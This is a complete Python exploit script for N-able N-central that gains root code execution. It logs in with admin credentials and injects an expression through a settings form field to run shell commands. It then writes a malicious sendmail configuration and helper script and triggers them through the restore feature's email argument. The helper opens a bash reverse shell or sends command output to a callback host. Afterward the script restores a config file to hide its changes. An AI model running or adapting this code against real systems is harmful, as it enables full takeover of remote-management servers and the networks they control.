#!/usr/bin/env python3
import argparse
import base64
import getpass
import os
import secrets
import socket
import threading
import time

import requests
import urllib3


def main():
    p = argparse.ArgumentParser(description="N-central restore Sendmail -C root RCE")
    p.add_argument("--target", default="https://192.168.1.14:8443")
    p.add_argument("--username", default="productadmin@n-able.com")
    p.add_argument("--password", default=os.getenv("PRODUCTADMIN_PASSWORD"))
    p.add_argument("--command", default="/usr/bin/id")
    p.add_argument("--callback-host", required=True)
    p.add_argument("--listen-host", default="0.0.0.0")
    p.add_argument("--callback-port", type=int, default=9004)
    p.add_argument("--lhost")
    p.add_argument("--lport", type=int)
    a = p.parse_args()
    password = a.password or getpass.getpass("Password: ")
    reverse = bool(a.lhost or a.lport)
    if reverse and not (a.lhost and a.lport):
        p.error("--lhost and --lport must be supplied together")

    received = []
    listener = None
    if not reverse:
        listener = socket.socket()
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((a.listen_host, a.callback_port))
        listener.listen(1)

        def accept():
            conn, _ = listener.accept()
            with conn:
                received.append(conn.recv(65535).decode(errors="replace"))

        threading.Thread(target=accept, daemon=True).start()

    suffix = secrets.token_hex(5)
    config_path = f"/opt/nable/webapps/ROOT/tmp/sendmail_{suffix}.cf"
    helper_path = f"/opt/nable/webapps/ROOT/tmp/sendmail_{suffix}.sh"
    backup_path = f"/var/opt/n-central/tmp/ncrestore_{suffix}.bak"
    if reverse:
        effect = f"/bin/bash -c 'bash -i >& /dev/tcp/{a.lhost}/{a.lport} 0>&1'"
    else:
        encoded = base64.b64encode(a.command.encode()).decode()
        effect = (
            f"out=$(echo {encoded}|base64 -d|/bin/bash 2>&1);"
            f"exec 3<>/dev/tcp/{a.callback_host}/{a.callback_port};printf '%s\\n' \"$out\" >&3"
        )
    helper = (
        "#!/bin/bash\n"
        f"trap 'rm -f {config_path} {helper_path}' EXIT\n"
        + effect
        + "\n"
    ).encode()
    config = (
        "V10/Berkeley\n"
        "O DefaultUser=0:0\n"
        "O DontBlameSendmail=RunProgramInUnsafeDirPath,RunWritableProgram\n"
        f"F{{X}}|{helper_path}\n"
    ).encode()

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    target = a.target.rstrip("/")
    s = requests.Session()
    s.verify = False
    s.get(target + "/login", timeout=30)
    login = s.post(
        target + "/loginLoginAction.action",
        data={"username": a.username, "password": password, "customerId": "1", "soName": ""},
        allow_redirects=False,
        timeout=30,
    )
    if login.status_code != 302:
        raise SystemExit(f"login={login.status_code}")
    s.get(target + "/IndexAction.action", timeout=30)
    action = target + "/saveModuleSecurityManagerProfilesAction.action"

    def shell(command, timeout=60):
        encoded = base64.b64encode(command.encode()).decode()
        runtime = f"/bin/bash -c echo${{IFS}}{encoded}|/usr/bin/base64${{IFS}}-d|/bin/bash"
        expression = (
            "new com.nable.dms.core.service.system.impl.ProcessServiceImpl()"
            f".executeCommand('{runtime}', {timeout * 1000}L)"
        )
        response = s.post(
            action,
            headers={"X-Requested-With": "XMLHttpRequest"},
            data={"ncentralTabId": "sendmail", "currentModule": expression},
            timeout=timeout + 10,
        )
        if response.status_code not in (200, 500):
            raise SystemExit(f"stage={response.status_code}")

    def stage(path, data):
        for offset in range(0, len(data), 36):
            chunk = base64.b64encode(data[offset : offset + 36]).decode()
            redirect = ">" if offset == 0 else ">>"
            shell(f"printf '%s' '{chunk}'|base64 -d {redirect}{path}")

    shell(f"cp /opt/nable/var/ncsai/etc/ncrestore.conf {backup_path}; chmod 600 {backup_path}")
    stage(config_path, config)
    stage(helper_path, helper)
    shell("chmod 755 " + helper_path)
    values = {
        "SYSTEM_RESTORE": "2",
        "0": ".|restore-" + suffix,
        "console_device": "/dev/null",
        "NOTIFY_ON_FAILURE": "true",
        "NOTIFY_ON_SUCCESS": "false",
        "NOTIFY_FROM": "root@localhost",
        "NOTIFY_EMAIL": "-C" + config_path,
    }
    form = {"ncentralTabId": "restore", "runNow": "true"}
    form.update({f"keyFieldMap['{k}']": v for k, v in values.items()})
    trigger = s.post(
        target + "/saveRestoreBackupAction.action",
        headers={"X-Requested-With": "XMLHttpRequest", "ncentralTabId": "restore"},
        data=form,
        timeout=90,
    )
    print(f"login={login.status_code}")
    print("stage=ok")
    print(f"restore={trigger.status_code}")
    if not reverse:
        for _ in range(120):
            if received:
                break
            time.sleep(0.25)
        if received:
            print(received[0].strip())
        listener.close()
    else:
        time.sleep(5)
    shell(f"cat {backup_path} >/opt/nable/var/ncsai/etc/ncrestore.conf; rm -f {backup_path}")


if __name__ == "__main__":
    main()
